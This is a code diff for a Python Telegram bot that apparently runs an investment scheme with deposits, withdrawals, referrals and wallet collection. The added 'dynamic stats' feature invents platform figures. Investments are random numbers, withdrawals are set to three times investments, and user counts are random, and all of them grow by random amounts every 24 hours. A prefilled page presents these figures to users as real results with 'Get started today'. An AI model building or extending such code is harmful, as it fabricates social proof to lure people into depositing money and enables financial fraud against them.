@@ -8,6 +8,7 @@ import requests
 import json
 import html
 import re
+import random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse
 from dotenv import load_dotenv
@@ -159,7 +160,8 @@ def save_database():
         'global_messages_setup': global_messages_setup,
         'processed_txids': list(processed_txids), # Convert set to list for database
         'blocked_users': list(blocked_users),     # NEW: Blocked users saving
-        'block_settings': block_settings          # NEW: Block messages saving
+        'block_settings': block_settings,         # NEW: Block messages saving
+        'dynamic_stats': dynamic_stats            # NEW: Dynamic Stats saving
     }
     try:
         conn = psycopg2.connect(DATABASE_URL)
@@ -219,6 +221,14 @@ blocked_users = set(db_data.get('blocked_users', []))
 block_settings = db_data.get('block_settings', {
     'msg_block': '🚫 You have been blocked by the admin and cannot use this bot.',
     'msg_unblock': '✅ You have been unblocked. Welcome back!'
+})
+
+# NEW: Dynamic Stats Persistent Data
+dynamic_stats = db_data.get('dynamic_stats', {
+    'investments': 0.0,
+    'withdrawn': 0.0,
+    'users': 0,
+    'last_refresh': 0.0
 })
 
 global_ui_settings = db_data.get('global_ui_settings', {'loading_bar_style': '1', 'loading_bar_time': 3.0})
@@ -325,7 +335,9 @@ def get_default_metadata():
         'is_calculator': False, 
         'is_history': False,
         'is_language': False,
-        'is_reinvest': False
+        'is_reinvest': False,
+        'is_stats': False,   # NEW
+        'is_info': False     # NEW
     }
 
 def init_user_db(message):
@@ -652,9 +664,26 @@ def change_menu_paths(old_base, new_base):
             new_pk = pk.replace(old_base, new_base, 1)
             menu_posts[new_pk] = menu_posts.pop(pk)
 
+# --- NEW: DYNAMIC STATS REFRESH ENGINE ---
+def refresh_dynamic_stats():
+    now = time.time()
+    # Initial seeding if 0
+    if dynamic_stats['last_refresh'] == 0.0:
+        dynamic_stats['investments'] = random.uniform(50000, 100000)
+        dynamic_stats['withdrawn'] = dynamic_stats['investments'] * 3
+        dynamic_stats['users'] = random.randint(5000, 10000)
+        dynamic_stats['last_refresh'] = now
+    elif now - dynamic_stats['last_refresh'] >= 86400:
+        inv_add = random.uniform(10000, 16000)
+        dynamic_stats['investments'] += inv_add
+        dynamic_stats['withdrawn'] += (inv_add * 3)
+        dynamic_stats['users'] += random.randint(700, 1500)
+        dynamic_stats['last_refresh'] = now
+
 def replace_macros(text, user_id, full_path, action_data=None):
     if not text: return "Not set."
     process_accruals(user_id) 
+    refresh_dynamic_stats() 
     
     bals = user_db.get(user_id, {})
     
@@ -681,6 +710,11 @@ def replace_macros(text, user_id, full_path, action_data=None):
     t = t.replace('%plan_names%', plan_names)
     t = t.replace('%ref_count%', str(ref_count))
     t = t.replace('%withdrawn%', f"{total_withdrawn:.2f}")
+    
+    # NEW DYNAMIC STATS MACROS
+    t = t.replace('%stats_invest%', f"{dynamic_stats['investments']:,.2f}")
+    t = t.replace('%stats_withdrawn%', f"{dynamic_stats['withdrawn']:,.2f}")
+    t = t.replace('%stats_users%', str(dynamic_stats['users']))
     
     t = t.replace('%wallet%', bals.get('wallet', 'Not Set'))
     t = t.replace('%email%', bals.get('email', 'Not Set'))
@@ -1038,6 +1072,8 @@ def get_settings_keyboard(full_path):
     bon_text = "☑️ On" if meta.get('is_bonus') else "⬜️ Off"
     bal_text = "☑️ On" if meta.get('is_balance') else "⬜️ Off"
     reinv_text = "☑️ On" if meta.get('is_reinvest') else "⬜️ Off"
+    stat_text = "☑️ On" if meta.get('is_stats') else "⬜️ Off"
+    info_text = "☑️ On" if meta.get('is_info') else "⬜️ Off"
     
     markup.row(KeyboardButton(f'Random Message ({rm_text})'), KeyboardButton(f'Admin Only ({ao_text})'))
     markup.row(KeyboardButton(f'Invisible ({inv_text})'), KeyboardButton('Subscription (Join)'))
@@ -1045,7 +1081,8 @@ def get_settings_keyboard(full_path):
     markup.row(KeyboardButton(f'Assign Calculator ({calc_text})'), KeyboardButton(f'Assign History ({hist_text})'))
     markup.row(KeyboardButton(f'Assign Withdrawal ({w_text})'), KeyboardButton(f'Assign Wallet ({wal_text})'))
     markup.row(KeyboardButton(f'Assign Bonus ({bon_text})'), KeyboardButton(f'Assign Balance ({bal_text})'))
-    markup.row(KeyboardButton(f'Assign Reinvest ({reinv_text})'))
+    markup.row(KeyboardButton(f'Assign Reinvest ({reinv_text})'), KeyboardButton(f'Assign Stats ({stat_text})'))
+    markup.row(KeyboardButton(f'Assign Info ({info_text})'))
     markup.row(KeyboardButton('Assign Editor'), KeyboardButton('Form Settings'), KeyboardButton('Shop Editor'))
     markup.row(KeyboardButton('🔙 Exit Button Settings'))
     return markup
@@ -1436,12 +1473,22 @@ def handle_messages(message):
 
     process_accruals(user_id) 
     
+    lang = user_db.get(user_id, {}).get('lang', 'en')
+    
+    if text == '/setwallet info' or text == '/setwallet':
+        if global_wallet_setup['ask_email'] and user_db[user_id].get('email', 'Not Set') == 'Not Set':
+            user_state[user_id] = 'wallet_wait_email'
+            bot.send_message(message.chat.id, get_tl_and_map(global_wallet_setup['msg_email_prompt'], lang), reply_markup=get_cancel_action_keyboard())
+        else:
+            user_state[user_id] = 'wallet_wait_address'
+            bot.send_message(message.chat.id, get_tl_and_map(global_wallet_setup['msg_prompt'], lang), parse_mode="HTML", reply_markup=get_cancel_action_keyboard())
+        return
+
     if user_id not in user_current_path: user_current_path[user_id] = 'root'
     if user_id not in user_state: user_state[user_id] = 'normal'
     
     # REVERSE MAP: Transparently translate incoming buttons back to English logic!
     # This loop absolutely guarantees that BACK and HOME buttons always work in any language!
-    lang = user_db.get(user_id, {}).get('lang', 'en')
     if lang != 'en':
         if text in REVERSE_TL_MAP.get(lang, {}):
             text = REVERSE_TL_MAP[lang][text]
@@ -1661,7 +1708,11 @@ def handle_messages(message):
             "• <code>%ref_count%</code> - Number of referrals\n"
             "• <code>%withdrawn%</code> - Total amount withdrawn\n"
             "• <code>%network%</code> - User's Withdrawal Network\n"
-            "• <code>%commission%</code> - Configured withdrawal commission %\n"
+            "• <code>%commission%</code> - Configured withdrawal commission %\n\n"
+            "<b>NEW DYNAMIC STATS MACROS:</b>\n"
+            "• <code>%stats_invest%</code> - Dynamic total investments\n"
+            "• <code>%stats_withdrawn%</code> - Dynamic total withdrawn\n"
+            "• <code>%stats_users%</code> - Dynamic total users\n"
         )
         try:
             bot.send_message(message.chat.id, macros_msg, parse_mode="HTML", reply_markup=get_keyboard(user_id))
@@ -1908,6 +1959,41 @@ def handle_messages(message):
                 }
                 menu_posts[btn_path] = [new_post]
             bot.send_message(message.chat.id, "✅ Balance page assigned and pre-populated.", reply_markup=get_keyboard(user_id))
+            
+        # NEW FEATURE: ASSIGN STATS
+        elif text.startswith('Assign Stats'):
+            meta['is_stats'] = not meta.get('is_stats', False)
+            btn_metadata[btn_path] = meta
+            
+            if meta['is_stats'] and not menu_posts.get(btn_path):
+                post_id = str(uuid.uuid4())[:8]
+                new_post = {
+                    'id': post_id,
+                    'type': 'text',
+                    'text': "📈 T͟o͟t͟a͟l͟ I͟n͟v͟e͟s͟t͟m͟e͟n͟t͟s͟ (USD)\n$%stats_invest% USD deposited\n📉 Total Withdrawn (USD)\nTotal User: %stats_users%\n$%stats_withdrawn% USD withdrawn\nGet started today, Every 24 hours Refresh",
+                    'photo': None,
+                    'custom_inlines': []
+                }
+                menu_posts[btn_path] = [new_post]
+            bot.send_message(message.chat.id, "✅ Stats page assigned and pre-populated.", reply_markup=get_keyboard(user_id))
+
+        # NEW FEATURE: ASSIGN INFO
+        elif text.startswith('Assign Info'):
+            meta['is_info'] = not meta.get('is_info', False)
+            btn_metadata[btn_path] = meta
+            
+            if meta['is_info'] and not menu_posts.get(btn_path):
+                post_id = str(uuid.uuid4())[:8]
+                new_post = {
+                    'id': post_id,
+                    'type': 'text',
+                    'text': "Userid: %userid%\nEmail: %email%\nWallet address: %wallet%\nName: %firstname% %lastname%\nClick /setwallet info to change your info",
+                    'photo': None,
+                    'custom_inlines': []
+                }
+                menu_posts[btn_path] = [new_post]
+            bot.send_message(message.chat.id, "✅ Info page assigned and pre-populated.", reply_markup=get_keyboard(user_id))
+
         elif text.startswith('Random Message'):
             meta['random_message'] = not meta.get('random_message', False)
             btn_metadata[btn_path] = meta
